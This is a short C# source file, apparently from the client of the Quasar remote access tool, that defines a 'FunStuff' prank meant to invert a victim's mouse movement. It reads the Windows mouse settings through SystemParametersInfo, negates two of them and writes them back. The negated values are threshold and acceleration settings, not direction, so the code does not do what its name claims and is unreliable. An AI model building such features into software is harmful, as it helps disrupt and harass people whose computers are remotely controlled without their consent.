using System.Runtime.InteropServices;

namespace Quasar.Client.FunStuff
{
    public static class InvertMouseMovement
    {
        [DllImport("user32.dll")]
        private static extern bool SystemParametersInfo(uint uiAction, uint uiParam, ref int pvParam, uint fWinIni);

        private const uint SPI_GETMOUSE = 0x0003;
        private const uint SPI_SETMOUSE = 0x0004;

        public static void DoInvertMouseMovement()
        {
            int[] mouseParams = new int[3];
            SystemParametersInfo(SPI_GETMOUSE, 0, ref mouseParams[0], 0);

            mouseParams[0] = -mouseParams[0];
            mouseParams[1] = -mouseParams[1];

            SystemParametersInfo(SPI_SETMOUSE, 0, ref mouseParams[0], 0);
        }
    }
}
